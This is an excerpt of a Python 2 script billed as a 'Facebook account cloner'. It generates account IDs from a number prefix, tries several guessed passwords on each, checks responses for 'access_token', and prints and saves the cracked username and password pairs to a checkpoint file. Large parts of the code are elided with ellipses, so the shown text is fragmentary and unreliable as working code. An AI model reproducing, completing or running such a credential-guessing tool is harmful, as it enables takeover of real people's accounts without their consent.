...
\x1b[0;30m    FACEBOOK ACCOUNT CLONER BY \x1b[3;90mSOMI STAR BOY
\033[1;0m
"""
def Somi():
    os.system('clear')
...
def action():
    ...
    if Somi == '':
        ...
        print logo2
        try:
            k = raw_input('\x1b[1;96m  ')
            print logo1
            c = raw_input('\x1b[1;93m  ')
            idlist = '.txt'
    ...
    print 47 * '\x1b[0;95m-'
    xxx = str(len(id))
    jalan('\x1b[0;96m[\xe2\x9c\x93] TOTAL NUMBERS: ' + xxx)
    time.sleep(0.5)
    jalan('\x1b[0;92m[\xe2\x9c\x93] PLEASE WAIT, PROCESS IS START ...')
    time.sleep(0.5)
    jalan('\x1b[0;93m[!] TO STOP THIS PROCESS PRESS Ctrl THEN Z')
    time.sleep(0.5)
    print 47 * '\x1b[0;95m-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;93m[AFTAR \x1b[1;96m7 DAYS] \033[1;96m ' + k + user + c + '  \033[1;97m | \033[1;94m  ' + pass1 + '\n'
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;93m[AFTAR \x1b[1;96m7 DAYS] \033[1;96m ' + k + user + c + '  \033[1;97m | \033[1;94m' + pass2 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;93m[AFTAR \x1b[1;96m7 DAYS] \033[1;96m ' + k + user + c + '\033[1;97m | \033[1;94m  ' + pass3 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        ...
                        if 'access_token' in q:
                            ...
                            print '\x1b[1;93m[AFTAR \x1b[1;96m7 DAYS] \033[1;96m ' + k + user + c + '\033[1;97m | \033[1;94m  ' + pass4 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
